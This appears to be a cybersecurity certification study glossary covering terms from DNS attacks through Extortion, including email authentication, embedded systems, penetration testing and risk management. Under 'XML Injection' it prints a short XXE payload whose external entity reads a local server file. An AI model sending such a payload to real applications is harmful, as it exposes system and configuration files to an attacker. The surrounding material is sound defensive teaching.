Version control refers to tracking and controlling changes to documents, code, or other important data. Organizations can use version control to maintain a historical record of changes, ensure only approved changes are implemented, and quickly revert changes to a previous version as warranted. Version control is also important when diagrams, policies, and procedures require updates. In this way, version control prevents confusion associated with using outdated or inconsistent documents.

Assessing how a change impacts existing policies, procedures, and diagrams is essential, and change management plans should include provisions requiring updates to these documents as part of the implementation. The frequency of diagram and documentation updates varies, but they are typically updated whenever significant changes or modifications to a process, system, or application occur. Once document updates have been completed, the new versions should be clearly labeled, and the older versions should be archived but still available for reference. Major changes may necessitate training for relevant teams or departments.

Change management is a crucial aspect of implementing changes to a system or application. By assessing the potential technical implications of these changes, organizations can take necessary steps to minimize disruptions. Effective change management requires following specific processes, such as developing implementation plans and conducting thorough testing procedures. Through change management, leadership can ensure that any changes made are successful and contribute positively to the organization.

Some examples of different documentation impacted by change management include the following:

1. Change Requests - Change requests themselves should be reviewed and updated to reflect the details and status of the change, including any modifications or approvals during the change management process.

2. Policies and Procedures - Changes may impact existing policies and procedures. As a result, these documents need to be reviewed and updated to ensure they align with the new processes, guidelines, or controls introduced through the change.

3. System or Process Documentation - Documentation should reflect any changes to systems, applications, or processes. It may involve updating system architecture, diagrams, process flows, standard operating procedures (SOPs), or user manuals to represent the current state and functionality of the changed system.

4. Configuration Management Documentation - Changes to configuration items, such as servers, networks, or databases, should be tracked and documented within the configuration management system to maintain an accurate record of its configuration.

5. Training Materials - Changes often impact employees, and they may require more training. Existing training materials, such as presentations, manuals, or computer-based learning modules, must be reviewed and updated as warranted.

6. Incident Response and Recovery Plans - Changes made to systems or applications may necessitate updates to incident response and recovery plans to ensure they account for the revised configurations, new dependencies, or recovery procedures resulting from the change.

Policies and procedures must change as often as technology does, which is often!
Domain Name System (DNS) Attacks - The domain name system (DNS) resolves requests for named host and services to IP addresses. Name resolution is a critical addressing method on the Internet and on private networks. There are many potential attacks against DNS. On the public Internet, attacks might use typosquatting techniques to cause victims to confuse malicious sites with legitimate ones. DNS can be exploited in a DRDoS attack. Threat actors can also directly target public DNS services as a means of performing DoS against a website or cloud resource. Finally, a threat actor might be able to hijack a public DNS server and insert spoofed records, directing victims to rogue websites.

On a private network, a DNS attack is likely to mean some sort of DNS poisoning (An attack where a threat actor injects false resource records into a client or server cache to redirect a domain name to an IP address of the attacker's choosing). DNS poisoning compromises the process by which clients query name servers to locate the IP address for a domain name. There are several ways that a DNS poisoning attack can be perpetrated.

DNS-Based On-Path Attacks
If the threat actor has access to the same local network as the victim, the attacker can use ARP poisoning to respond to DNS queries from the victim with spoofed replies. This might be combined with a denial of service attack on the victim's legitimate DNS server. A rogue DHCP could be used to configure clients with the address of a DNS resolver controlled by the threat actor.

DNS Client Cache Poisoning
Before DNS was developed in the 1980s, name resolution took place using a text file named HOSTS. Each name:IP address mapping was recorded in this file, and systems administrators had to download the latest copy and install it on each Internet client or server manually. Even though most name resolution now functions through DNS, the HOSTS file is still present and most operating systems check the file before using DNS. Its contents are loaded into a cache of known name:IP mappings , and the client only contacts a DNS server if the name is not cached. Therefore, if an attacker is able to place a false name:IP address mapping in the HOSTS file and effectively poison the DNS cache, they will be able to redirect traffic. The HOSTS file requires administrator access to modify. In UNIX and Linux systems it is stored as /etc/hosts , while in Windows it is placed in %SystemRoot%\System32\Drivers\etc\hosts . The presence of suspect entries in the HOSTS file is an indicator that the machine has been compromised.

DNS Server Cache Poisoning
DNS server cache poisoning aims to corrupt the records held by the DNS server itself. This can be accomplished by performing DoS against the server that holds the authorized records for the domain, and then spoofing replies to requests from other name servers. Another attack involves getting the victim name server to respond to a recursive query from the attacking host. A recursive query compels the DNS server to query the authoritative server for the answer on behalf of the client. The attacker's DNS, masquerading as the authoritative name server, responds with the answer to the query, but also includes a lot of false domain:IP mappings for other domains that the victim DNS accepts as genuine. The nslookup or dig tool can be used to query the name records and cached records held by a server to discover whether any false records have been inserted.

DNS Attack Indicators
A DNS server may log an event each time it handles a request to convert between a domain name and an IP address. DNS event logs can hold a variety of information that may supply useful security intelligence and attack indicators, such as the following:

1. The types of queries a host has made to DNS.

2. Hosts that are in communication with suspicious IP address ranges or domains.

3. Statistical anomalies such as spikes or consistently large numbers of DNS lookup failures, which may point to computers that are infected with malware, misconfigured, or running obsolete or faulty applications.

DNS is also a popular choice for implementing command & control (C&C) of remote access Trojans. It can be used as a means of covertly exfiltrating data from a private network.
Domain-based Message Authentication, Reporting & Conformance (DMARC) - Framework for ensuring proper application of SPF and DKIM, utilizing a policy published as a DNS record.

Domain-based Message Authentication, Reporting & Conformance (DMARC) uses the results of SPF and DKIM checks to define rules for handling messages, such as moving messages to quarantine or spam, rejecting them outright, or tagging the message. DMARC also provides reporting capabilities, giving the owner of a domain visibility into which systems are sending emails on their behalf, including unauthorized activity.
DomainKeys Identified Mail (DKIM) - A cryptographic authentication mechanism for mail utilizing a public key published as a DNS record.

DomainKeys Identified Mail (DKIM) leverages encryption features to enable email verification by allowing the sender to sign emails using a digital signature. The receiving email server uses a DKIM record in the sender's DNS record to verify the signature and the email's integrity.
Downgrade Attack - A cryptographic attack where the attacker exploits the need for backward compatibility to force a computer system to abandon the use of encrypted messages in favor of plaintext messages.

A downgrade attack makes a server or client use a lower specification protocol with weaker ciphers and key lengths. For example, a combination of an on-path and downgrade attack on HTTPS might try to force the client to use a weak version of transport layer security (TLS) or even downgrade to the legacy secure sockets layer (SSL) protocol. This makes it easier for a threat actor to force the use of weak cipher suites and forge the signature of a certificate authority that the client trusts.

A type of downgrade attack is used to attack Active Directory. A Kerberoasting attack attempts to discover the passwords that protect service accounts by obtaining service tickets and subjecting them to brute force password cracking attacks. If the credential portion of the service ticket is encrypted using AES, it is very hard to brute force. If the attack is able to cause the server to return the ticket using weak RC4 encryption, a cracker is more likely to be able to extract the service password.

Evidence of downgrade attacks is likely to be found in server logs or by intrusion detection systems.
Due Diligence - A legal principle that a subject has used best practice or reasonable care when setting up, configuring, and maintaining a system. Due diligence is a legal term meaning that responsible persons have not been negligent in discharging their duties.
Dynamic Analysis - Software testing that examines code behavior during runtime. It helps identify potential security issues, potential performance issues, and other problems.
E-discovery - Procedures and tools to collect, preserve, and analyze digital evidence.
EAP over LAN (EAPoL) - A port-based network access control (PNAC) mechanism that allows the use of EAP authentication when a host connects to an Ethernet switch.
Email (Message-Based Vector) - The attacker sends a malicious file attachment via email, or via any other communications system that allows attachments. The attacker needs to use social engineering techniques to persuade or trick the user into opening the attachment.
Email Data Loss Prevention - Email is one of the most frequently used communication channels within organizations. It serves as a conduit for sensitive data such as financial information, intellectual property, customer and employee data, and personally identifiable information (PII.) Given its popularity and the sensitivity of the data it often carries, email is a common vector for data loss, making data loss prevention (DLP - A software solution that detects and prevents sensitive information from being stored on unauthorized systems or transmitted over unauthorized networks) protections exceedingly important.

While convenient, the ease of use and quick transmission capabilities of email can inadvertently encourage careless handling of sensitive data. Human errors, such as sending confidential data to the wrong recipients or failing to use secure methods for data transmission, are common and underscore the importance of DLP measures. In addition, DLP solutions are crucial in guarding against insider threats. Insiders can pose significant data leakage risks due to a lack of policy awareness or malicious intent.

Regulations like GDPR, HIPAA, and PCI DSS impose stringent requirements for protecting specific data types, with DLP serving as a key mechanism to ensure compliance and avoid unauthorized data transmission. Additionally, because email is a primary target for attacks, DLP protections significantly mitigate the risk of data loss, ensuring the appropriate handling and protection of sensitive information.

Data loss prevention (DLP) technologies prevent unauthorized sharing or dissemination of sensitive information. DLP policies are essential for monitoring and controlling the content used in communication platforms like email. DLP scans emails and attachments for certain types of sensitive information defined by the organization's DLP policies, including credit card numbers, social security numbers, proprietary information, or any sensitive or confidential data. If an email contains these types of information, the DLP system can take several actions based on predefined rules, such as blocking the email, alerting the sender or administrator, or automatically encrypting it before transmission.

Enforcing DLP in email is essential for many organizations, especially those handling sensitive customer data or subject to regulations like GDPR, HIPAA, or PCI DSS. DLP helps organizations minimize the risk of data breaches, avoid noncompliance penalties, and maintain data security and privacy. DLP is often enforced using email gateways and security policies on endpoint protection tools.
Email Gateway - An email gateway is the control point for all incoming and outgoing email traffic. It acts as a gatekeeper, scrutinizing all emails to remove potential threats before they reach inboxes. Email gateways utilize several security measures, including anti-spam filters, antivirus scanners, and sophisticated threat detection algorithms to identify phishing attempts, malicious URLs, and harmful attachments. Email gateways leverage DMARC, SPF, and DKIM to automate the authentication and validation of email senders, reducing the chances that spoofed or impersonated emails will be delivered.

Email gateways also play a critical role in policy enforcement by allowing organizations to create rules related to email content and attachments based on established policies or regulatory compliance requirements. Attachment blocking, content filtering, and data loss prevention are common tasks email gateways handle.
Email Security - Three technologies have emerged as essential for verifying the authenticity of emails and preventing phishing and spam: Sender Policy Framework (SPF), Domain Keys Identified Mail (DKIM), and Domain-based Message Authentication, Reporting & Conformance (DMARC).

Sender Policy Framework (SPF - A DNS record identifying hosts authorized to send mail for the domain) is an email authentication method that helps detect and prevent sender address forgery commonly used in phishing and spam emails. SPF works by verifying the sender's IP address against a list of authorized sending IP addresses published in the DNS TXT records of the email sender's domain. When an email is received, the receiving mail server checks the SPF record of the sender's domain to verify the email originated from one of the pre-authorized systems.

DomainKeys Identified Mail (DKIM - A cryptographic authentication mechanism for mail utilizing a public key published as a DNS record) leverages encryption features to enable email verification by allowing the sender to sign emails using a digital signature. The receiving email server uses a DKIM record in the sender's DNS record to verify the signature and the email's integrity.

Domain-based Message Authentication, Reporting & Conformance (DMARC - Framework for ensuring proper application of SPF and DKIM, utilizing a policy published as a DNS record) uses the results of SPF and DKIM checks to define rules for handling messages, such as moving messages to quarantine or spam, rejecting them outright, or tagging the message. DMARC also provides reporting capabilities, giving the owner of a domain visibility into which systems are sending emails on their behalf, including unauthorized activity.

The combined use of SPF, DKIM, and DMARC significantly enhances email security by making it much more difficult for attackers to impersonate trusted domains, which is one of the most common tactics used in phishing and spam attacks. These protocols are essential tools in the fight against email-based threats because they provide essential mechanisms that help verify the authenticity of emails, maintain the integrity of the email content, and ensure the safe delivery of electronic communication.

Email Gateway
An email gateway is the control point for all incoming and outgoing email traffic. It acts as a gatekeeper, scrutinizing all emails to remove potential threats before they reach inboxes. Email gateways utilize several security measures, including anti-spam filters, antivirus scanners, and sophisticated threat detection algorithms to identify phishing attempts, malicious URLs, and harmful attachments. Email gateways leverage DMARC, SPF, and DKIM to automate the authentication and validation of email senders, reducing the chances that spoofed or impersonated emails will be delivered.

Email gateways also play a critical role in policy enforcement by allowing organizations to create rules related to email content and attachments based on established policies or regulatory compliance requirements. Attachment blocking, content filtering, and data loss prevention are common tasks email gateways handle.

Secure/Multipurpose Internet Mail Extensions
Secure/Multipurpose Internet Mail Extensions (S/MIME) is a protocol for securing email communications. It encrypts emails and enables sender authentication to ensure the confidentiality and integrity of email communications. S/MIME uses public key encryption techniques to secure email content (the "body" of email). S/MIME also incorporates digital signatures to support sender verification and ensure messages are unmodified. By providing encryption and authentication capabilities, S/MIME significantly enhances the security of email communication, but its implementation is often complicated and prone to misconfiguration.
Email Services - Email services use two types of protocols:

1. The Simple Mail Transfer Protocol (SMTP - Application protocol used to send mail between hosts on the Internet. Messages are sent between servers over TCP port 25 or submitted by a mail client over secure port TCP/587) specifies how mail is sent from one system to another.

2. A mailbox protocol stores messages for users and allows them to download them to client computers or manage them on the server.

Secure SMTP (SMTPS)
To deliver a message, the SMTP server of the sender discovers the IP address of the recipient SMTP server using the domain name part of the email address. The SMTP server for the domain is registered in DNS using a mail exchanger (MX) record.

SMTP communications can be secured using TLS. This works much like HTTPS with a certificate on the SMTP server. There are two ways for SMTP to use TLS:

1. STARTTLS - It is a command that upgrades an existing unsecure connection to use TLS. This is also referred to as explicit TLS or opportunistic TLS.

2. SMTPS i It establishes the secure connection before any SMTP commands (HELO, for instance) are exchanged. This is also referred to as implicit TLS.

The STARTTLS method is generally more widely implemented than SMTPS. Typical SMTP configurations use the following ports and secure services:

1. Port 25 - It is used for message relay (between SMTP servers or message transfer agents [MTA]). If security is required and supported by both servers, the STARTTLS command can be used to set up the secure connection.

2. Port 587 - It is used by mail clients ( message submission agents [MSA]) to submit messages for delivery by an SMTP server. Servers configured to support port 587 should use STARTTLS and require authentication before message submission.

3. Port 465 - It is used by some providers and mail clients for message submission over implicit TLS (SMTPS), though this usage is now deprecated by standards documentation.

Secure POP (POP3S)
The Post Office Protocol v3 (POP3 - Application protocol that enables a client to download email messages from a server mailbox to a client over port TCP/110 or secure port TCP/995) is a mailbox protocol designed to store the messages delivered by SMTP on a server. When the client connects to the mailbox, POP3 downloads the messages to the recipient's email client.

A POP3 client application, such as Microsoft Outlook or Mozilla Thunderbird, establishes a TCP connection to the POP3 server over port 110. The user is authenticated (by username and password), and the contents of their mailbox are downloaded for processing on the local PC. POP3S is the secured version of the protocol operating over TCP port 995 by default.

Secure IMAP (IMAPS)
Compared to POP3, the Internet Message Access Protocol (IMAP - Application protocol providing a means for a client to access and manage email messages stored in a mailbox on a remote server. IMAP4 utilizes TCP port number 143, while the secure version IMAPS uses TCP/993) supports permanent connections to a server and connects multiple clients to the same mailbox simultaneously. It also allows a client to manage mail folders on the server. Clients connect to IMAP over TCP port 143. They authenticate themselves , then retrieve messages from the designated folders. Like other email protocols, the connection can be secured by establishing an SSL/TLS tunnel. The default port for IMAPS is TCP port 993.
Embedded Systems - An electronic system that is designed to perform a specific, dedicated function, such as a microcontroller in a medical drip or components in a control system managing a water treatment plant.

Embedded systems are used in various specialized applications, including consumer electronics, industrial automation, automotive systems, medical devices, and more. Some examples include the following:

1. Home appliances - Such as refrigerators, washing machines, and coffee makers, contain embedded systems that control their functions and operations.

2. Smartphones and tablets - Contain a variety of embedded systems, including processors, sensors, and communication modules.

3. Automotive systems - Like modern cars contain embedded systems including engine control units, entertainment systems, and safety systems like airbags and anti-lock brakes.

4. Industrial automation - Embedded systems exist in control systems and machinery, such as robots, assembly lines, and sensors.

5. Medical devices - Such as pacemakers, insulin pumps, and blood glucose monitors, contain embedded systems that control their functions and provide data to healthcare providers.

6. Aerospace and defense - Like aircraft, satellites, and military equipment use embedded systems for navigation, communication, and control.

Real-Time Operating Systems
A Real-Time Operating Systems (RTOS) is a type of operating system designed for use in applications that require real-time processing and response. They are purpose-specific operating systems designed for high levels of stability and processing speed.

Examples of RTOS
The VxWorks operating system is commonly used in aerospace and defense systems. VxWorks provides real-time performance and reliability and is therefore well suited for use in aircraft control systems, missile guidance systems, and other critical defense systems. Another example of an RTOS is FreeRTOS, an open-source operating system used in many embedded systems, such as robotics, industrial automation, and consumer electronics.

In the automotive industry, RTOS is used in engine control, transmission control, and active safety systems applications. For example, the AUTOSAR (Automotive Open System Architecture) standard defines a framework for developing automotive software, including using RTOS for certain applications. In medical devices, RTOS is used for applications such as patient monitoring systems, medical imaging, and automated drug delivery systems.

In industrial control systems, RTOS is used for process control and factory automation applications. For example, the Siemens SIMATIC WinCC Open Architecture system uses an RTOS to provide real-time performance and reliability for industrial automation applications.

Risks Associated with RTOS
A security breach involving RTOS can have serious consequences. RTOS software can be complex and difficult to secure, which makes it challenging to identify and address vulnerabilities that could be exploited by attackers.

Another security risk associated with RTOS is the potential for system-level attacks. An attacker who gains access to an RTOS-based system could potentially disrupt critical processes or gain control over the system it is designed to control. This can lead to serious consequences considering the types of applications that rely on RTOS, such as medical devices and industrial control systems. A security breach could result in harm to people or damage to equipment.
Encapsulating Security Payload (ESP) - IPSec sub-protocol that enables encryption and authentication of the header and payload of a data packet. Can be used to encrypt the packet rather than simply calculating an ICV. ESP attaches three fields to the packet: a header, a trailer (providing padding for the cryptographic function), and an Integrity Check Value. Unlike AH, ESP excludes the IP header when calculating the ICV.
Encryption - Scrambling the characters used in a message so that the message can be seen but not understood or modified unless it can be deciphered. Encryption provides for a secure means of transmitting data and authenticating users. It is also used to store data securely. Encryption uses different types of cipher and one or more keys. The size of the key is one factor in determining the strength of the encryption product. An encryption algorithm or cipher is a type of cryptographic process that encodes data so that it can be stored or transmitted securely and then decrypted only by its owner or its intended recipient. Using a key with the encryption cipher ensures that decryption can only be performed by an authorized person.
Encryption Fundamentals - Basic concepts and components of encryption systems including plaintext, ciphertext, keys, and algorithms.
Endpoint Detection and Response (EDR) - A software agent that collects system data and logs for analysis by a monitoring system to provide early detection of threats.
Endpoint Logs - A target for security-related events generated by host-based malware and intrusion detection agents.

An endpoint log is likely to refer to events monitored by security software running on the host rather than by the OS itself. This can include host-based firewalls and intrusion detection, vulnerability scanners, and antivirus/antimalware protection suites. Suites that integrate these functions into a single product are often referred to as an endpoint protection platform (EPP), endpoint detection and response (EDR), or extended detection and response (XDR). These security tools can be directly integrated with a SIEM using agent-based software.

Summarizing events from endpoint protection logs can show overall threat levels, such as amount of malware detected, number of host intrusion detection events, and numbers of hosts with missing patches. Close analysis of detection events can assist with attributing intrusion events to a specific actor and developing threat intelligence of tactics, techniques, and procedures.
Enterprise Authentication - A wireless network authentication mode where the access point acts as pass-through for credentials that are verified by an AAA server.
Enterprise Risk Management (ERM) - The comprehensive process of evaluating, measuring, and mitigating the many risks that pervade an organization.

Risk management is complex and treated very differently in companies and institutions of different sizes, and with different regulatory and compliance requirements. Most companies will institute enterprise risk management (ERM) policies and procedures, based on frameworks such as NIST's Risk Management Framework (RMF) or ISO 31K. These legislative and framework compliance requirements are often formalized as a Risk and Control Self-Assessment (RCSA). An organization may also contract an external party to lead the process, in which case it is referred to as a Risk and Control Assessment (RCA).

A RCSA is an internal process undertaken by stakeholders to identify risks and the effectiveness with which controls mitigate those risks. RCSAs are often performed through questionnaires and workshops with department managers. The outcome of an RCSA is a report. Up-to-date RCSA reports are critical to the external audit process.
Entropy - A measure of disorder. Cryptographic systems should exhibit high entropy to better resist brute force attacks.
Environmental Attack - A physical threat directed against power, cooling, or fire suppression systems.

An environmental attack could be an attempt to perform denial of service. For example, a threat actor could try to destroy power lines, cut through network cables, or disrupt cooling systems. Alternatively, environmental and building maintenance systems are known vectors for threat actors to try to gain access to company networks.

The risk from physical attacks means that premises must be monitored for signs of physical damage or the addition of rogue devices.
Environmental Variables (Vulnerability Assessment) - In vulnerability assessment, factors or metrics due to local network or host configuration that increase or decrease the base likelihood and impact risk level.

Several environmental variables play a significant role in influencing vulnerability analysis. One of the primary environmental factors is the organization's IT infrastructure which includes the hardware, software, networks, and systems in use. These components' diversity, complexity, and age can affect the number and types of vulnerabilities present. For instance, legacy systems may have known unpatched vulnerabilities, while new emerging technologies might introduce unknown vulnerabilities.

The external threat landscape is another crucial environmental factor. The prevalence of certain types of attacks or the activities of specific threat actors can affect the likelihood of exploitation of particular vulnerabilities. For example, if ransomware attacks are rising within the medical industry, that sector can prioritize those vulnerabilities.

The regulatory and compliance environment is another significant factor. Organizations in heavily regulated industries, like healthcare or finance, may need to prioritize vulnerabilities that could lead to sensitive data breaches and result in regulatory penalties. The operational environment, including the organization's workflows, business processes, and usage patterns, can also influence vulnerability analysis. Certain operational practices increase exposure to specific vulnerabilities or affect the potential impact of a successful exploit. Examples include poor patch management practices, lack of rigorous access controls, lack of awareness training, poor configuration management practices, and insufficient application development policies.
Ephemeral Session Key - In cryptography, a key that is used within the context of a single session only.
Error Handling - A well-written application must be able to handle errors and exceptions (An application vulnerability that is defined by how an application responds to unexpected errors that can lead to holes in the security of an app) gracefully. This means that the application performs in a controlled way when something unpredictable happens. An error or exception could be caused by invalid user input, a loss of network connectivity, another server or process failing, and so on. Ideally, the programmer will have written a structured exception handler (SEH - A mechanism to account for unexpected error conditions that might arise during code execution. Effective error handling reduces the chances that a program could be exploited) to dictate what the application should then do. Each procedure can have multiple exception handlers.

Some handlers will deal with anticipated errors and exceptions; there should also be a catchall handler that will deal with the unexpected. The main goal must be for the application not to fail in a way that allows the attacker to execute code or perform some sort of injection attack. One infamous example of a poorly written exception handler is the Apple GoTo bug (https://www.wired.com/2014/02/gotofail/).

Another issue is that an application's interpreter may default to a standard handler and display default error messages when something goes wrong. These may reveal platform information and the inner workings of code to an attacker. It is better for an application to use custom error handlers so that the developer can choose the amount of information shown when an error is caused.

Technically, an error is a condition that the process cannot recover from, such as the system running out of memory. An exception is a type of error that can be handled by a block of code without the process crashing. Note that exceptions are still described as generating error codes/messages, however.
Escalation (Incident Response) - In the context of support procedures, incident response, and breach-reporting, escalation is the process of involving expert and senior staff to assist in problem management.

A breach may be detected by technical staff and if the event is considered minor, there may be a temptation to remediate the system and take no further notification action. This could place the company in legal jeopardy. Any breach of personal data and most breaches of IP should be escalated to senior decision-makers and any impacts from legislation and regulation properly considered.
Evaluation Scope - Evaluation target or scope refers to the product, system, or service being analyzed for potential security vulnerabilities. This could be a software application, a network, a security service, or even an entire IT infrastructure. The target is the focus of a specific evaluation process, where it is subjected to rigorous testing and analysis to identify any possible weaknesses or vulnerabilities in its design, implementation, or operation. For application vulnerabilities, the target would refer to a specific software application. Security analysts assess application code, logic, data handling, authentication mechanisms, and many other aspects relevant to its security. Identified vulnerabilities often range from common ones, such as injection flaws, broken authentication, and sensitive data exposure, to more obscure ones related to the application's unique features or purpose. The primary goal of the evaluation is to mitigate risk, improve the application's security posture, and ensure compliance with relevant security standards or regulations.

1. Security Testing - Conducting vulnerability assessments and penetration testing to identify potential weaknesses, vulnerabilities, or misconfigurations.

2. Documentation Review - Reviewing documentation, such as design specifications, architecture diagrams, security policies, and procedures, to ensure the system is implemented according to secure design principles and compliance requirements.

3. Source Code Analysis - Analyzing source code to identify potential security vulnerabilities or coding errors to uncover issues related to input validation, secure coding practices, and coding standards.

4. Configuration Assessment - Evaluating configuration settings to ensure they align with security best practices and industry standards, such as assessing access controls, encryption settings, authentication mechanisms, and other security-related configurations.

5. Cryptographic Analysis - Assessing cryptographic mechanisms, including encryption algorithms, key management, and secure key storage, to ensure the proper implementation and use of cryptographic schemes according to industry standards and guidelines.

6. Compliance Verification - Verifying compliance with standards specified by relevant regulations, frameworks, or security certifications.

7. Security Architecture Review - Evaluating security architecture and design to identify potential weaknesses or gaps in security controls, such as insufficient segregation of duties, lack of audit trails, or inadequate access controls.

Penetration Tester vs. Attacker
From the perspective of a penetration tester or an attacker, the scope defines the boundaries of their objectives.

For a penetration tester, the scope is the specific system, application, network, or environment they are authorized to evaluate for exploitability. Understanding the scope allows a penetration tester to plan their testing strategy, select appropriate tools and techniques, and focus their efforts where they will be most effective. Penetration testers aim to uncover as many vulnerabilities as possible within the scope, report their findings, and recommend remediation strategies to improve the system's security posture.

For an attacker, the scope describes their intended target. The attacker aims to identify and exploit vulnerabilities within the target to achieve their objectives, which could range from unauthorized access and data theft to service disruption or even system takeover. An attacker's understanding of the target can influence their choice of attack vectors and the sophistication of their tactics.

In both cases, a thorough understanding of the target—its architecture, components, interconnections, security controls, potential vulnerabilities, and value of its data or services—helps to focus time and effort.
Event Viewer - A Windows console related to viewing and exporting events in the Windows logging file format.
Evidence of Internal Audits (Vendor Assessment Method) - When performing vendor due diligence, looking for evidence that the vendor has internal audit practices is crucial. Internal audit provides an independent and objective evaluation of an organization's internal controls, risk management practices, and compliance with policies and regulations. By examining the presence and effectiveness of internal audits within a vendor's operations, businesses can gain confidence in the vendor's commitment to good governance, risk management, and compliance. Evidence of internal audit demonstrates that the vendor has established mechanisms for internal oversight, periodic assessments, and continuous improvement of their processes. It demonstrates a proactive approach to risk identification and mitigation and a commitment to secure operations.
Evil Twin - A wireless access point that deceives users into believing that it is a legitimate network access point. An evil twin might use typosquatting or SSID stripping to make the rogue network name appear similar to the legitimate one.
Executable File (Lure-Based Vector) - The threat actor conceals exploit code in a program file. One example is Trojan Horse malware. A Trojan is a program that seems to be something free and useful or fun, but it actually contains a process that will create backdoor access to the computer for the threat actor.
Exercise Types (Penetration Testing) - Penetration testing is a crucial component of cybersecurity assessments that involves simulating real-world attacks on computer systems, networks, or applications to identify vulnerabilities and weaknesses. Different types of penetration tests exist to address specific objectives related to a security evaluation, such as testing specific systems, assessing incident response capabilities, measuring the effectiveness of physical controls, and many other areas. Different types of penetration tests allow organizations to use a flexible and prioritized approach toward security assessments.

Offensive and Defensive Penetration Testing
Offensive penetration testing (The "hostile" or attacking team in a penetration test or incident response exercise), often called "Red Teaming," is a proactive and controlled approach to simulate real-world cyberattacks on an organization's systems, networks, and applications. The primary goal of offensive penetration testing is to identify vulnerabilities, weaknesses, and potential attack vectors that malicious actors could exploit. This testing is typically performed by skilled and ethical cybersecurity professionals who mimic potential attackers' tactics, techniques, and procedures (TTPs).

Defensive penetration testing (The defensive team in a penetration test or incident response exercise), or "Blue Teaming," evaluates an organization's defensive security measures, detection capabilities, incident response procedures, and overall resilience against cyber threats. Defensive penetration testing aims to assess the effectiveness of existing security controls and identify areas for improvement.

Physical Penetration Testing
Physical penetration testing (Assessment techniques that extend to site and other physical security systems), or physical security testing, describes assessments of an organization's physical security practices and controls. It involves simulating real-world attack scenarios to identify vulnerabilities and weaknesses in physical security systems, such as access controls, surveillance, and perimeter defenses. Physical penetration testing aims to assess the effectiveness of physical security controls and identify potential entry points or weaknesses that an attacker could exploit. During physical penetration testing, a skilled tester attempts to gain unauthorized physical access to restricted areas, sensitive information, or critical assets within the organization using techniques like social engineering, tailgating, lock picking, bypassing alarms or surveillance systems, and exploiting physical vulnerabilities.

Integrated Penetration Testing
Integrated penetration testing (A holistic approach that combines different types of penetration testing methodologies and techniques to evaluate an organization's security operations) refers to a holistic approach that combines different types of penetration testing methodologies and techniques to assess the overall security of an organization's systems, networks, applications, and physical infrastructure. Integrated penetration testing aims to provide a comprehensive and realistic evaluation of an organization's security operations. The importance of integrated penetration testing lies in its ability to accurately represent the organization's security posture and identify potential risks often overlooked when testing in isolated areas. For example, the combination of offensive and defensive penetration testing provides a comprehensive assessment of an organization's security posture. Offensive testing identifies vulnerabilities and weaknesses, while defensive testing evaluates the organization's ability to detect and respond to threats. By integrating both approaches, organizations can improve their security capabilities to better protect against different threats.

A similar concept is called continuous pentesting, which focuses on technical vulnerabilities and often configured to leverage automation, especially for CI/CD environments.
Explicit TLS (FTPES) - It uses the AUTH TLS command to upgrade an unsecure connection established over port 21 to a secure one. This protects authentication credentials. The data connection for the file transfers can also be encrypted (using the PROT command).
Exposure Factor - In risk calculation, the percentage of an asset's value that would be lost during a security incident or disaster scenario.

Vulnerability analysis must also consider exposure factors like the accessibility of a vulnerable system or data and environmental factors like the current threat landscape or the specifics of the organization's IT infrastructure. These factors can significantly influence the likelihood of a vulnerability being exploited and directly impact its overall risk level.

Exposure factor (EF) represents the extent to which an asset is susceptible to being compromised or impacted by a specific vulnerability, and it helps assess the potential impact or loss that could occur if the vulnerability is exploited. Factors might include weak authentication mechanisms, inadequate network segmentation, or insufficient access control methods.
Extensible Authentication Protocol (EAP) - Framework for negotiating authentication methods that enable systems to use hardware-based identifiers, such as fingerprint scanners or smart card readers, for authentication and to establish secure tunnels through which to submit credentials. It provides a framework for deploying multiple types of authentication methods. It is often used with digital certificates to establish a trust relationship and create a secure tunnel to transmit the user credential or to perform smart-card authentication without a password.
Extensible Markup Language (XML) - A system for structuring documents so that they are human and machine readable. Information within the document is placed within tags, which describe how information within the document is structured.
Extensible Markup Language (XML) Injection - Extensible Markup Language (XML - A system for structuring documents so that they are human and machine readable. Information within the document is placed within tags, which describe how information within the document is structured) is used by apps for authentication and authorizations, and for other types of data exchange and uploading. Data submitted via XML with no encryption or input validation is vulnerable to spoofing, request forgery, and injection of arbitrary data or code. For example, an XML External Entity (XXE) attack embeds a request for a local resource:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM "file:///etc/config"> ]>

<bar>&bar;</bar>

This defines an entity named bar that refers to a local file path. A successful attack will return the contents of /etc/config as part of the response.
External Assessments (Governance & Compliance) - 1. Regulatory - Regulatory authorities or agencies perform assessments to ensure compliance with specific laws, regulations, or industry standards. Regulatory assessments evaluate whether organizations adhere to mandatory regulatory requirements and promote a culture of compliance. Regulatory assessments typically involve inspections, audits, or reviews of processes, practices, and controls to verify compliance, identify deficiencies, and enforce regulatory obligations. Regulatory assessments play a critical role in safeguarding public interests, protecting consumers, maintaining market integrity, and upholding industry standards. They help mitigate risks, ensure fair competition, and enhance transparency and accountability in regulated industries.

2. Examination - An external examination typically refers to an independent and formal evaluation conducted by external parties, such as auditors or regulators, to assess the accuracy, reliability, and compliance of an organization's financial statements, processes, controls, or specific aspects of its operations. External examinations focus on verifying information accuracy and ensuring compliance with applicable laws, regulations, or industry standards. Examples of external examinations include financial statement audits, regulatory compliance audits, and specific assessments of control environments.

3. Assessment - An external assessment generally refers to a broad evaluation conducted by external experts or consultants to assess an organization's overall performance, practices, capabilities, or specific focus areas. External assessments can encompass various elements, such as strategy, operational efficiency, risk management, cybersecurity, or compliance practices. The goal is to provide an objective and independent perspective on the organization's strengths, weaknesses, and opportunities for improvement.

4. Independent Third-Party Audit - Independent third-party audits provide objective and unbiased assessments of an organization's systems, controls, processes, and compliance. The importance of independent third-party audits lies in their ability to offer an external perspective, free from any conflicts of interest or bias. Independent audits instill confidence among stakeholders, including customers, business partners, regulatory bodies, and investors, as they attest to an organization's commitment to quality, compliance, and good governance. They also help organizations demonstrate transparency, accountability, and adherence to industry standards and regulations.

External entities could include certified public accountants (CPAs), external auditors, consulting firms, regulatory bodies, or specialized assessment agencies. The independence of these external assessors ensures impartiality and objectivity in the evaluation process.
External Threat Actor - The degree of access that a threat actor possesses before initiating an attack when they have no standing privileges. An external threat actor has no account or authorized access to the target system. A malicious external threat must infiltrate the security system using unauthorized access, such as breaking into a building or hacking into a network. Note that an external actor may perpetrate an attack remotely or on-premises. It is the threat actor that is external rather than the attack method.
Extortion - Demanding payment to prevent or halt some type of attack. Extortion is demanding payment to prevent or halt some type of attack. For example, a threat actor might have used malware to block access to an organization's computers and demand payment to unlock them.
